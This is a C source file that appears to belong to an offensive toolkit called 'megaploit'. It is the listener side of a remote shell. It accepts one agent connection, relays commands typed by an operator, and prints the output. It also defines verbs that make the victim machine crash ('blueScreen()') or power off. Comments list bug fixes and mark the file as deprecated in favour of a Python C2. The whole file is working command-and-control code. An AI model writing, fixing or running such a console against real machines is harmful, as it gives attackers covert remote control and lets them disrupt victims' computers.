/*
 * serverShell.c  –  C-remote-shell operator console (Linux / macOS)
 *
 * Listens on sPort, accepts one client connection, then loops:
 *   1. Print a prompt with the client's IP.
 *   2. Read a command from stdin.
 *   3. Send the command to the client.
 *   4. For commands that produce output, receive and print the response.
 *
 * Bugs fixed vs. original
 * -----------------------
 *  FIX 1: sAddress.sin_addr.s_addr was never assigned — bind() was silently
 *          falling back to INADDR_ANY.  The assignment was wrongly placed on
 *          cAddress (the accept() output struct).  Moved to sAddress and made
 *          it explicit: use INADDR_ANY so the server listens on all interfaces,
 *          matching the original intent.
 *
 *  FIX 2: "forceOff()" strncmp length was 12 (reads 2 bytes past the 10-char
 *          string).  Corrected to 10.
 *
 *  FIX 3: The blueScreen / forceOff / q branches all `break` before reaching
 *          the `else { recv(...) }` block.  However the dangling `else` was
 *          only attached to forceOff, meaning a correctly sent "blueScreen()"
 *          would fall into the recv() branch.  Replaced the chain with an
 *          explicit if/else-if/else-if/else ladder so every branch is clear.
 *
 *  FIX 4: write() sent the full 1024-byte buffer including NUL padding.
 *          Changed to send only the actual command length (strlen).
 *
 *  FIX 5: Unreachable jmp: label removed.
 *
 *  FIX 6: Unused variable `n` removed.
 *
 *  FIX 7: iSock (the listening socket) was never closed on exit.  Added
 *          close(iSock) and close(iSock_Client) before return.
 *
 *  FIX 8: socket() return value was not checked for -1.
 *
 *  FIX 9: accept() return value was not checked for -1.
 *
 *  FIX 10: write() / recv() return values were not checked.
 *
 * == THIS SOURCE CODE IS OUTDATED AS OF THIS CURRENT COMMIT ==
 *
 * PROTOCOL INCOMPATIBILITY
 * ------------------------
 * The C agent (client/) now uses TLS + HMAC-SHA256 + AES-256-GCM.
 * This file speaks raw plaintext TCP with no authentication.
 * Building this file against the current C agent will result in connection
 * failures.  Use the Python C2 (megaploit/server/) for all operations.
 *
 * This file is gated behind LEGACY_C_SERVER_ACKNOWLEDGED to prevent
 * accidental production use.  Defining that macro means you understand
 * that this server CANNOT be used with the modern C agent.
 */

#ifndef LEGACY_C_SERVER_ACKNOWLEDGED
#  error "serverShell.c is DEPRECATED and incompatible with the C agent. " \
         "Use the Python C2 (megaploit/server/) instead. " \
         "Define -DLEGACY_C_SERVER_ACKNOWLEDGED to build for reference only."
#endif

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <arpa/inet.h>

/* Write all bytes in buf to fd, retrying on short writes (EINTR / partial).
 * Returns 0 on success, -1 on hard error.                                  */
static int write_all(int fd, const char *buf, size_t n)
{
    size_t sent = 0;
    while (sent < n) {
        ssize_t w = write(fd, buf + sent, n - sent);
        if (w < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        sent += (size_t)w;
    }
    return 0;
}

/* ── Configuration ─────────────────────────────────────────────────────── */
/* May be overridden at compile time: gcc -DLISTEN_PORT=4444 ...             */
#ifndef LISTEN_PORT
#  define LISTEN_PORT  50005
#endif
#define LISTEN_ADDR  INADDR_ANY   /* listen on all interfaces */

/* ── recv_full ──────────────────────────────────────────────────────────── */
/* BUG: the original code called recv() once and printed whatever arrived.
 * TCP is a stream protocol — a response may span multiple recv() calls.
 * recv_full() reads with a 200 ms SO_RCVTIMEO and loops until the socket
 * goes quiet, collecting all data for one command response.                 */
static ssize_t recv_full(int fd, char *buf, size_t bufsz)
{
    struct timeval tv;
    tv.tv_sec  = 0;
    tv.tv_usec = 200 * 1000;   /* 200 ms */
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    size_t total = 0;
    while (total < bufsz - 1) {
        ssize_t n = recv(fd, buf + total, bufsz - 1 - total, 0);
        if (n > 0) {
            total += (size_t)n;
        } else if (n == 0) {
            if (total == 0) { tv.tv_sec = tv.tv_usec = 0; setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)); return -1; }
            break;
        } else {
            break;  /* EAGAIN / EWOULDBLOCK — no more data yet */
        }
    }

    tv.tv_sec = tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    return (ssize_t)total;
}

int main(void)
{
    /* Ignore SIGPIPE so that write() to a disconnected agent socket returns
     * EPIPE rather than killing the server process silently.               */
    signal(SIGPIPE, SIG_IGN);

    int                iSock, iSock_Client;
    char               buffer[1024];
    char               cResp[18384];
    struct sockaddr_in sAddress, cAddress;
    int                optval = 1;
    socklen_t          cLen;

    /* ── Create listening socket ──────────────────────────────────────── */
    iSock = socket(AF_INET, SOCK_STREAM, 0);
    if (iSock < 0) {                          /* FIX 8 */
        perror("socket");
        return 1;
    }

    if (setsockopt(iSock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        perror("setsockopt");
        close(iSock);
        return 1;
    }

    /* ── Bind ─────────────────────────────────────────────────────────── */
    memset(&sAddress, 0, sizeof(sAddress));
    sAddress.sin_family      = AF_INET;
    sAddress.sin_addr.s_addr = htonl(LISTEN_ADDR);   /* FIX 1: was on cAddress */
    sAddress.sin_port        = htons(LISTEN_PORT);

    if (bind(iSock, (struct sockaddr *)&sAddress, sizeof(sAddress)) != 0) {
        perror("bind");
        close(iSock);
        return 1;
    }

    /* ── Listen / accept ──────────────────────────────────────────────── */
    listen(iSock, 5);
    printf("[*] Listening on port %d ...\n", LISTEN_PORT);

    cLen         = sizeof(cAddress);
    iSock_Client = accept(iSock, (struct sockaddr *)&cAddress, &cLen);
    if (iSock_Client < 0) {                   /* FIX 9 */
        perror("accept");
        close(iSock);
        return 1;
    }
    printf("[+] Connection from %s\n", inet_ntoa(cAddress.sin_addr));

    /* ── Command loop ─────────────────────────────────────────────────── */
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(cResp,  0, sizeof(cResp));

        /* Print prompt */
        printf("%s~$: ", inet_ntoa(cAddress.sin_addr));
        fflush(stdout);

        /* Read command from stdin */
        if (fgets(buffer, sizeof(buffer), stdin) == NULL) break;
        strtok(buffer, "\n");

        /* FIX 4: send only the actual command string, not the full buffer */
        size_t cmdLen = strlen(buffer);
        if (cmdLen == 0) continue;

        /* FIX 9+10: use write_all() — handles partial writes and SIGPIPE  */
        if (write_all(iSock_Client, buffer, cmdLen) < 0) {
            perror("write");
            break;
        }

        /* ── Dispatch on command type ─────────────────────────────────── */

        /* FIX 3: explicit if/else-if ladder instead of dangling-else chain */

        /* FIX: strncmp("q",buffer,1) matches any command starting with 'q'
         * (e.g. "quit").  The "q" verb is exactly one character.          */
        if (cmdLen == 1 && buffer[0] == 'q') {
            /* Client will disconnect — we're done */
            break;
        }
        else if (strncmp("blueScreen()", buffer, 12) == 0) {
            /* Client triggers a BSOD — no response expected */
            break;
        }
        else if (strncmp("forceOff()", buffer, 10) == 0) { /* FIX 2: was 12 */
            /* Client powers off — no response expected */
            break;
        }
        else {
            /* General command — wait for and print the response */
            /* BUG: plain recv() was used — replaced with recv_full()     */
            ssize_t nRecv = recv_full(iSock_Client, cResp, sizeof(cResp));
            if (nRecv <= 0) {
                if (nRecv < 0) perror("recv");
                break;
            }
            cResp[nRecv] = '\0';
            printf("%s\n", cResp);
        }
    }

    /* FIX 7: close both sockets before exit */
    close(iSock_Client);
    close(iSock);
    return 0;
}
